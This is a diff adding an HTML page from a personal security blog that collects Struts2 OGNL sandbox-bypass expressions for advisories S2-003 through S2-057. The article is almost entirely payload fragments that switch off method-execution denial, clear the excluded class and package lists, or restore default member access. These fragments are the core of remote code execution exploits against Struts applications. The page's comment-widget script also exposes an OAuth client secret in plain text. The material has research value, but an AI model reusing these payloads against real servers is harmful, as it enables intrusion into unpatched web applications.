@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+  <title>Struts2 OGNL沙箱历史绕过方式总结 - 老路的博客</title>
+  <meta property="og:title" content="Struts2 OGNL沙箱历史绕过方式总结 - 老路的博客" />
+  <meta name="twitter:title" content="Struts2 OGNL沙箱历史绕过方式总结 - 老路的博客" />
+  <meta name="description" content="沙箱绕过 s2-003 绕过方式:
+#context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]=false, #_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET  s2-005 绕过方式：
+#_memberAccess.allowStaticMethodAccess=true #context[&#39;xwork.">
+  <meta property="og:description" content="沙箱绕过 s2-003 绕过方式:
+#context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]=false, #_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET  s2-005 绕过方式：
+#_memberAccess.allowStaticMethodAccess=true #context[&#39;xwork.">
+  <meta name="twitter:description" content="沙箱绕过 s2-003 绕过方式:
+#context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]=false, #_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET  s2-005 绕过方式： …">
+  <meta name="author" content="Dean"/>
+  <meta property="og:site_name" content="老路的博客" />
+  <meta property="og:url" content="https://dean2021.github.io/posts/struts-bypass-sandbox/" />
+  <meta property="og:type" content="article" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="generator" content="Hugo 0.55.6" />
+
+  <link rel="stylesheet" href="/css/style.css" media="all" />
+  <link rel="stylesheet" href="/css/syntax.css" media="all" />
+  <link rel="stylesheet" href="/css/custom.css" media="all" />
+
+  <script src="/js/script.js"></script>
+  <script src="/js/custom.js"></script>
+  <script defer src="/js/fontawesome.js"></script>
+</head>
+
+<body>
+
+<header class="site-header">
+  <nav class="site-navi">
+    <h1 class="site-title"><a href="/">老路的博客</a></h1>
+    <ul class="site-navi-items">
+      <li class="site-navi-item-home"><a href="/" title="Home">Home</a></li>
+      <li class="site-navi-item-categories"><a href="/categories/" title="Categories">Categories</a></li>
+      <li class="site-navi-item-tags"><a href="/tags/" title="Tags">Tags</a></li>
+      <li class="site-navi-item-archives"><a href="/archives/" title="Archives">Archives</a></li>
+      <li class="site-navi-item-books"><a href="/books/" title="Books">Books</a></li>
+      <li class="site-navi-item-link"><a href="/link/" title="Links">Links</a></li>
+      <li class="site-navi-item-about"><a href="/about/" title="About">About</a></li>
+
+       <li class="site-navi-item-plan"><a href="/posts/plan/" title="plan">Plan</a></li>
+    </ul>
+  </nav>
+</header>
+<hr class="site-header-bottom">
+
+  <div class="main" role="main">
+    <article class="article">
+      
+      
+      <h1 class="article-title">Struts2 OGNL沙箱历史绕过方式总结</h1>
+      
+      <hr class="article-title-bottom">
+      <ul class="article-meta">
+        <li class="article-meta-date"><time>December 20, 2018</time></li>
+      </ul>
+      
+
+      
+
+<h3 id="沙箱绕过">沙箱绕过</h3>
+
+<p>s2-003 绕过方式:</p>
+
+<pre><code>#context[\'xwork.MethodAccessor.denyMethodExecution\']=false, 
+#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET
+</code></pre>
+
+<p>s2-005 绕过方式：</p>
+
+<pre><code>#_memberAccess.allowStaticMethodAccess=true
+#context['xwork.MethodAccessor.denyMethodExecution']=false
+#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET
+</code></pre>
+
+<p>S2-009 绕过方式:</p>
+
+<pre><code>#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]= new java.lang.Boolean(false)
+#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true
+</code></pre>
+
+<p>S2-013 绕过方式:</p>
+
+<pre><code>#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true
+</code></pre>
+
+<p>S2-016 绕过方式:</p>
+
+<pre><code>没有沙箱限制，直接执行OGNL表达式（TODO 未做深入研究）
+</code></pre>
+
+<p>S2-019 绕过方式:</p>
+
+<pre><code>#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),
+#f.setAccessible(true),
+#f.set(#_memberAccess,true)
+</code></pre>
+
+<p>S2-032 绕过方式:</p>
+
+<pre><code>#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS
+</code></pre>
+
+<p>S2-037 绕过方式:</p>
+
+<pre><code>#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS
+</code></pre>
+
+<p>S2-045 绕过方式:</p>
+
+<pre><code>(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(
+    #_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
+(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
+(#ognlUtil.getExcludedPackageNames().clear()).
+(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))
+</code></pre>
+
+<p>S2-046 绕过方式:</p>
+
+<pre><code>和s2-045的绕过方式一致
+</code></pre>
+
+<p>S2-048 绕过方式:</p>
+
+<pre><code>和s2-045的绕过方式一致
+</code></pre>
+
+<p>S2-057 绕过方式:</p>
+
+<pre><code>(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))
+
+(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS))
+</code></pre>
+
+<h3 id="引用">引用</h3>
+
+<ol>
+<li><a href="https://xz.aliyun.com/t/3395">作为武器的CVE-2018-11776：绕过Apache Struts 2.5.16 OGNL 沙箱</a></li>
+</ol>
+
+    </article>
+
+
+
+
+    <ul class="pager article-pager">
+      <li class="pager-newer">
+          <a href="/posts/linux-dns-hook/" data-toggle="tooltip" data-placement="top" title="Linux用户态Hook DNS方案">&lt; Newer</a>
+      </li>
+      <li class="pager-older">
+        <a href="/posts/s2-003/" data-toggle="tooltip" data-placement="top" title="Struts2框架: S2-003 漏洞详细分析">Older &gt;</a>
+      </li>
+    </ul>
+
+          <div id="gitalk-container"></div>
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+  <script>
+var gitalk = new Gitalk({
+  clientID: '2f61b9423ddfde01f318',
+  clientSecret: 'ae6360004775eb79f1069c0ea047f2fcd0f8cfc7',
+  repo: 'dean2021.github.io',
+  owner: 'dean2021',
+  admin: ['dean2021'],
+  id: location.pathname,      
+  distractionFreeMode: false  
+})
+
+gitalk.render('gitalk-container')
+  </script>
+
+
+
+  </div>
+
+
+<div class="site-footer">
+  <div class="copyright">&copy; Copyright 2018 Dean</div>
+  <ul class="site-footer-items">
+    <li class="site-footer-item-about"><a href="/about/" title="About">About</a></li>
+  </ul>
+  <div class="powerdby">
+    Powered by <a href="https://gohugo.io/">Hugo</a>  and Dean
+  </div>
+</div>
+
+
+</body>
+</html>
